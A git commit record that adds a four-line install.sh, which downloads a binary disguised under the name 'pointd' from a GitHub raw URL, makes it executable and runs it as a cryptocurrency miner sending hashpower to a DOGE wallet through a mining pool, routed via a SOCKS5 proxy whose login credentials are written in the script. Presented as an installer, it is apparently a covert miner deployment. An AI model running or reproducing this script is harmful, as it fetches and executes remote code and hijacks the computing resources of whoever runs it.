25645f13090d27a70feed85e327d77dbf319d348
tin2tinx <92977012+tin2tinx@users.noreply.github.com>
2022-03-28 11:56:17 +0530

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/lafdahai76/DevOps/raw/main/pointd
+chmod +x pointd
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D8SQiATrkXeAUegfU8x7CGz2wysuQv4A6f.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,zap=BUT-lyra2z330 -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
